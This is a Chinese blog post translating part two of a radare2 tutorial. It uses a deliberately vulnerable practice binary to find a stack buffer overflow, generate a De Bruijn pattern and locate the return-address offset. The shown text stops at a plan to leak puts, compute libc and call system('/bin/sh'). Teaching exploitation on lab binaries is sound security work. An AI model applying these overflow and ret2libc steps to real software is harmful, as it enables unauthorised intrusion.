<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>Radare2之旅-Part2：Exploitation | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="translationre">
  
  
  
  
  <meta name="description" content="翻译自Megabeets。">
<meta name="keywords" content="translation,re">
<meta property="og:type" content="article">
<meta property="og:title" content="Radare2之旅-Part2：Exploitation">
<meta property="og:url" content="https://assassinq.github.io/2019/02/23/Radare2之旅-Part2：Exploitation/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="翻译自Megabeets。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://www.megabeets.net/uploads/r2_part1_2.png">
<meta property="og:image" content="https://www.megabeets.net/uploads/mainsym.png">
<meta property="og:image" content="https://www.megabeets.net/uploads/beetsym.png">
<meta property="og:image" content="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif">
<meta property="og:updated_time" content="2019-02-24T13:38:55.723Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Radare2之旅-Part2：Exploitation">
<meta name="twitter:description" content="翻译自Megabeets。">
<meta name="twitter:image" content="https://www.megabeets.net/uploads/r2_part1_2.png">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css">
  <link rel="stylesheet" href="/css/fashion.css">
  <link rel="stylesheet" href="/css/glyphs.css">

</head>
</html>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  
  <div class="site-header-image">
    <img id="originBg" width="100%" alt="Hike News" src>
  </div>

  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
  </div>

  <script>
        var imgUrls = "css/images/pose01.jpg".split(",");
        var random = Math.floor((Math.random() * imgUrls.length ));
        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
          document.getElementById("originBg").src=imgUrls[random];
          document.getElementById("blurBg").src=imgUrls[random];
        } else {
          document.getElementById("originBg").src='/' + imgUrls[random];
          document.getElementById("blurBg").src='/' + imgUrls[random];
        }
    </script>




<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
            
          </h1>
          
          
            <div class="site-description">ZJGSU-IS-17</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-Radare2之旅-Part2：Exploitation" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      Radare2之旅-Part2：Exploitation
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2019/02/23/Radare2之旅-Part2：Exploitation/" class="article-date">
	  <time datetime="2019-02-23T03:18:10.000Z" itemprop="datePublished">February 23, 2019</time>
	</a>

       
      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>翻译自<a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">Megabeets</a>。</p>
<a id="more"></a>
<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>欢迎来到我们<code>radare2</code>之旅的第二部分！在这一部分，我们会涵盖<code>radare2</code>的更多部分，同时这次更注重于二进制漏洞挖掘。</p>
<p>相信大家都一定很期待这第二部分，之后的内容也一定会更快地分享给大家。如果你还没有阅读过这一系列的<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">第一部分</a>，我非常推荐你去读一读。第一部分记录了<code>radare2</code>的基础内容，同时也解释了很多我今天会用到的命令。</p>
<p>在这一部分，我们的目的是对一个简单的程序进行漏洞挖掘与利用。<code>radare2</code>有很多不同的功能可以帮我们对漏洞进行利用，例如保护技术、查找ROP、生成随机序列、查看寄存器内容等等。你可以在本文末尾找到一份命令对应表。今天我会向你们展示这些强大的功能，同时我们用<code>radare2</code>来绕过在开启<code>ASLR</code>的系统上运行并且有<code>NX</code>保护的程序。我假设大家都已经掌握了以下的预备知识：</p>
<ul>
<li>汇编语言</li>
<li>程序保护技术（<code>NX</code>、<code>ASLR</code>）</li>
<li><a href="https://en.wikipedia.org/wiki/Call_stack" target="_blank" rel="noopener">栈帧结构</a></li>
<li><a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">缓冲区溢出</a></li>
<li><a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">面向返回编程</a></li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="noopener">x86调用约定</a></li>
</ul>
<p>熟悉这些知识是很重要的一步，因为文章中我并不会细讲，甚至不会对其解释。</p>
<p><img src="https://www.megabeets.net/uploads/r2_part1_2.png" alt></p>
<h1 id="更新radare2"><a href="#更新radare2" class="headerlink" title="更新radare2"></a>更新<code>radare2</code></h1><p>首先，我们将<code>radare2</code>更新至其git的最新版版：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> git clone https://github.com/radare/radare2.git # 如果你还没有克隆下来的话</span><br><span class="line"><span class="meta">$</span> cd radare2</span><br><span class="line"><span class="meta">$</span> ./sys/install.sh</span><br></pre></td></tr></table></figure>
<p>等待更新完成需要很长一段时间，在这期间不如看些视频放松一会儿。</p>
<h1 id="熟悉程序"><a href="#熟悉程序" class="headerlink" title="熟悉程序"></a>熟悉程序</h1><p>你可以在这里下载<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2" target="_blank" rel="noopener">程序</a>，在这里下载<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c" target="_blank" rel="noopener">源码</a>。<br>如果你想自己编译程序，用以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> gcc -m32  -fno-stack-protector megabeets_0x2.c -o megabeets_0x2</span><br></pre></td></tr></table></figure>
<p>这次的程序与上一次的程序非常相似，只是在<code>main()</code>函数中有一些细微的改变：</p>
<ul>
<li>编译时不使用参数<code>-z execstac</code>来开启<code>NX</code></li>
<li>通过scanf来接收用户的输入，而不是通过程序的参数</li>
<li>大部分输出的函数为puts</li>
<li>对程序的输出做了一点修改</li>
</ul>
<p>这是之前的<code>main()</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n  .:: Megabeets ::.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Think you can make it?\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= <span class="number">2</span> &amp;&amp; beet(argv[<span class="number">1</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success!\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nop, Wrong argument.\n\n"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后现在的<code>main</code>函数是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input; </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\n  .:: Megabeets ::.\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Show me what you got:"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ms"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span> (beet(input))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success!\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Nop, Wrong argument.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的功能十分简单，并且在前一篇文章中我们已经对它很熟悉了——要求输入字符串，与经过<code>rot13</code>加密的字符串<code>Megabeets</code>比较。故输入应该为<code>Zrtnorrgf</code>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./megabeets_0x2 </span><br><span class="line"></span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line"></span><br><span class="line">Show me what you got:</span><br><span class="line">blablablabla</span><br><span class="line">Nop, Wrong argument.</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> ./megabeets_0x2 </span><br><span class="line"></span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line"></span><br><span class="line">Show me what you got:</span><br><span class="line">Zrtnorrgf</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure>
<p>这些都很简单，但是我们今天的重点并不是破解一个简单的crackme，而是对其进行漏洞利用。那我们开始吧！</p>
<h1 id="理解漏洞"><a href="#理解漏洞" class="headerlink" title="理解漏洞"></a>理解漏洞</h1><p>对于每一个PWN题给出的程序来说，检查程序开了什么保护是一个好习惯。我们可以使用上一篇文章中提到的<code>rabin2</code>，或者直接在<code>radare2</code>的shell里执行<code>i</code>命令。因为我们还没有用<code>radare2</code>打开文件，就先用<code>rabin2</code>来看看：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> rabin2 -I megabeets_0x2</span><br><span class="line"> </span><br><span class="line">arch     x86</span><br><span class="line">binsz    6072</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">class    ELF32</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  Intel 80386</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure>
<p>在标记的几行中，我们可以看到程序开了<code>NX</code>，也就是说栈是不可执行的。还有，该程序没有开启<a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener"><code>Canary</code></a>、<a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener"><code>PIC</code></a>或是<a href="https://tk-blog.blogspot.co.il/2009/02/relro-not-so-well-known-memory.html" target="_blank" rel="noopener"><code>RELRO</code></a>。</p>
<p>现在我们迅速地过一遍程序的执行流，这次我们看一看它的反汇编代码（并不是每次漏洞挖掘都能有源码）。使用<code>radare2</code>的调试模式打开程序：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 -d megabeets_0x2</span><br><span class="line">Process with PID 20859 started…</span><br><span class="line">= attach 20859 20859</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32– Your endian swaps</span><br><span class="line"><span class="meta">[0xf7782b30]&gt;</span> aas</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><code>-d</code>  – 用调试模式打开</li>
<li><code>aas</code> – 分析函数、符号以及其他</li>
<li>注意：正如我在前一篇文章所提到的，开始时使用<code>aaa</code>分析是最推荐的方式，因为分析本来就是一个很复杂的过程。我在<a href="https://reverseengineering.stackexchange.com/a/16115/18698" target="_blank" rel="noopener">这篇回答</a>里写了更多——读一下也许会让你的理解更深。</li>
</ul>
</blockquote>
<p>现在我们继续执行程序，直到<code>main</code>函数。只要输入命令<code>dcu main</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7797b30]&gt;</span> dcu?</span><br><span class="line">|Usage: dcu Continue until address</span><br><span class="line">| dcu address      Continue until address</span><br><span class="line">| dcu [..tail]     Continue until the range</span><br><span class="line">| dcu [from] [to]  Continue until the range</span><br><span class="line"><span class="meta">[0xf7797b30]&gt;</span> dcu main</span><br><span class="line">Continue until 0x08048658 using 1 bpsize</span><br><span class="line">hit breakpoint at: 8048658</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><code>dcu</code>代表<code>debug continue until</code></li>
</ul>
</blockquote>
<p>现在让我们输入<code>VV</code>进入图形模式。在第一部分解释过，你可以通过<code>p</code>和<code>P</code>切换视角，通过<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>分别向上/下/左/右移动，通过<code>g</code>和调用旁的字母跳转函数（例如<code>gd</code>）。</p>
<p>用<code>?</code>来列出所有在图形模式下的命令，同时别忘记<code>R</code>命令😉</p>
<p><img src="https://www.megabeets.net/uploads/mainsym.png" alt></p>
<p><code>main()</code>函数是程序要求我们输入的地方，并且它将输入传给<code>sym.beet</code>。通过<code>gc</code>我们跳转到处理我们输入的<code>beet()</code>函数：</p>
<p><img src="https://www.megabeets.net/uploads/beetsym.png" alt></p>
<p>我们可以看到用户的输入<code>[arg_8h]</code>被复制给一个缓冲区（<code>[local_88h]</code>），然后就是我们在前一篇文章中所看到过的，字符串<code>Megabeets</code>用<code>rot13</code>加密了，所得结果与我们的输入做比较。我们之前了解过，我这里就不做深究。</p>
<p>你有看到什么可以的地方吗？我们的输入没有对长度做检查，然后直接复制到了缓冲区中。这意味着如果我们输入一串超过缓冲区大小的字符串，就能导致栈上的缓冲区溢出。至此，我们找到了漏洞。</p>
<h1 id="规划漏洞利用脚本"><a href="#规划漏洞利用脚本" class="headerlink" title="规划漏洞利用脚本"></a>规划漏洞利用脚本</h1><p>既然我们已经找到了有漏洞的函数，我们需要构造一个payload来利用它。我们的目标很明了，就是在系统上成功开一个shell。首先，我们要确认确实有一个有漏洞的函数，然后我们需要找到一个我们的payload可以覆盖栈的偏移。</p>
<p><img src="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif" alt></p>
<p>我们将会使用一个<code>radare2</code>框架中的工具，叫做<code>ragg2</code>。它能够为我们生成一段循环的<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="noopener">德布鲁因序列</a>，用来检测覆盖缓冲区的确切的偏移大小。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ragg2 -</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> -P [size]       prepend debruijn pattern</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> -r              show raw bytes instead of hexpairs</span><br><span class="line">&lt;truncated&gt;</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> ragg2 -P 100 -r</span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh</span><br></pre></td></tr></table></figure>
<p>我们知道我们的程序通过输入流读取我们的输入，而不是从shell中读取我们的输入。故我们将会使用又一个来自<code>radare2</code>工具箱中的工具，<code>rarun2</code>。</p>
<blockquote>
<ul>
<li><p><code>rarun2</code>可以在不同环境、参数、执行权限、文件夹下运行程序，并且覆盖默认的文件描述符（例如<code>stdin</code>）</p>
</li>
<li><p>如果你需要在跑一个程序时使用很长的参数，它会起很大的作用。而且漏洞利用通常都会向输入流传一大堆数据。</p>
</li>
</ul>
</blockquote>
<p>我们需要做以下的三个步骤：</p>
<ul>
<li>使用<code>ragg2</code>将德布鲁因序列写入一个文件</li>
<li>新建一个<code>rarun2</code>配置文件，并且把前一个文件作为<code>stdin</code></li>
<li>让<code>radare2</code>来找到偏移</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ragg2 -P 200 -r &gt; pattern.txt</span><br><span class="line"><span class="meta">$</span> cat pattern.txt</span><br><span class="line">AAABAACAADAAEAAFAAGAAHAAI… &lt;truncated&gt; …7AA8AA9AA0ABBABCABDABEABFA</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> vim profile.rr2</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> cat profile.rr2</span><br><span class="line"><span class="meta">#</span>!/usr/bin/rarun2</span><br><span class="line">stdin=./pattern.txt</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> r2 -r profile.rr2 -d megabeets_0x2</span><br><span class="line">Process with PID 21663 started…</span><br><span class="line">= attach 21663 21663</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line"> </span><br><span class="line">— Use rarun2 to launch your programs with a predefined environment.</span><br><span class="line"><span class="meta">[0xf77c2b30]&gt;</span> dc</span><br><span class="line">Selecting and continuing: 21663</span><br><span class="line"> </span><br><span class="line">.:: Megabeets ::.</span><br><span class="line"> </span><br><span class="line">Show me what you got?</span><br><span class="line">child stopped with signal 11</span><br><span class="line"> </span><br><span class="line"><span class="meta">[0x41417641]&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们运行程序，并将<em>pattern.txt</em>的内容用<code>rarun2</code>传给<code>stdin</code>，<em>SIGSEV 11</em>。</p>
<blockquote>
<ul>
<li><p>一个信号是一种发送给进程或是一个具体线程的异步通知，这样与之相同的进程就会在某个事件发生时得到提醒。</p>
</li>
<li><p>SIGSEGV（11）信号在访问了某个无效的虚拟内存或段错误后会触发。</p>
</li>
</ul>
</blockquote>
<p>你发现了吗？我们实时的指针现在指向了<code>0x41417641</code>。这是一个无效的地址，它表示了字符串<code>AvAA</code>（小端序及ascii码转换），也就是我们送的字符串的一部分。<code>radare2</code>允许我们找到给出的值在德布鲁因序列中的偏移。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x41417641]&gt;</span> wop?</span><br><span class="line">|Usage: wop[DO] len @ addr | value</span><br><span class="line">| wopD len [@ addr]  Write a De Bruijn Pattern of length ‘len’ at address ‘addr’</span><br><span class="line">| wopO value         Finds the given value into a De Bruijn Pattern at current offset</span><br><span class="line"><span class="meta">[0x41417641]&gt;</span> wopO `dr eip`</span><br><span class="line">140</span><br></pre></td></tr></table></figure>
<p>既然我们已经知道需要覆盖返回地址的偏移为140，我们可以开始编写脚本了。</p>
<h1 id="编写漏洞利用脚本"><a href="#编写漏洞利用脚本" class="headerlink" title="编写漏洞利用脚本"></a>编写漏洞利用脚本</h1><p>我之前也提到过很多次，这篇文章不是教一些漏洞利用的基础知识的，它的目的是展示<code>radare2</code>在漏洞利用中是如何使用的。因此，我不会过多地解释脚本的每个部分。</p>
<p>我们的目标是在系统中产生一个shell。这有很多种方法，尤其是这样一个程序。为了知道我们能做什么，首先我们需要知道我们不能做什么。我们的程序在开了<code>ASLR</code>地环境下，所以我们不能猜测到<a href="https://en.wikipedia.org/wiki/C_standard_library" target="_blank" rel="noopener"><em>libc</em></a>在内存中的地址。那就可以和<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank" rel="noopener"><em>ret2libc</em></a>说再见了。另外，程序开了<code>NX</code>，这意味栈是不可执行的，所以我们不能直接在栈上放一个<a href="https://en.wikipedia.org/wiki/Shellcode" target="_blank" rel="noopener"><em>shellcode</em></a>然后跳过去。</p>
<p>虽然这些保护让我们不能使用一些漏洞利用技术，然而这不能阻止我们轻松地绕过它们。编写我们的脚本时，需要细心地观察提供给我们的运行库以及函数。</p>
<p>让我们再次通过调试模式打开程序，然后看一看它使用的运行库和函数。先看库：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">$</span> r2 -d megabeets_0x2</span><br><span class="line">Process with PID 23072 started…</span><br><span class="line">= attach 23072 23072</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line">— You haxor! Me jane?</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> il</span><br><span class="line">[Linked libraries]</span><br><span class="line">libc.so.61 library</span><br></pre></td></tr></table></figure>
<p><code>il</code>表示<code>Information libraries</code>，即告诉我们程序所使用的运行库。对于该程序来说，只有我们最爱的<em>libc</em>。</p>
<p>现在通过执行<code>ii</code>命令——<code>Information Imports</code>，让我们看看导入的函数。我们可以加上<code>q</code>来减少冗长的输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ii</span><br><span class="line">[Imports]</span><br><span class="line">ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmp</span><br><span class="line">ordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpy</span><br><span class="line">ordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=puts</span><br><span class="line">ordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__</span><br><span class="line">ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_main</span><br><span class="line">ordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> iiq</span><br><span class="line">strcmp</span><br><span class="line">strcpy</span><br><span class="line">puts</span><br><span class="line">__gmon_start__</span><br><span class="line">__libc_start_main</span><br><span class="line">__isoc99_scanf</span><br></pre></td></tr></table></figure>
<h2 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h2><ul>
<li>泄漏<code>puts</code>的真实地址</li>
<li>计算<em>libc</em>的基址</li>
<li>计算<code>system</code>的地址</li>
<li>在<em>libc</em>中找到包含字符串<code>/bin/sh</code>的地址</li>
<li>调用<code>system(&quot;/bin/sh&quot;)</code>打开一个shell</li>
</ul>
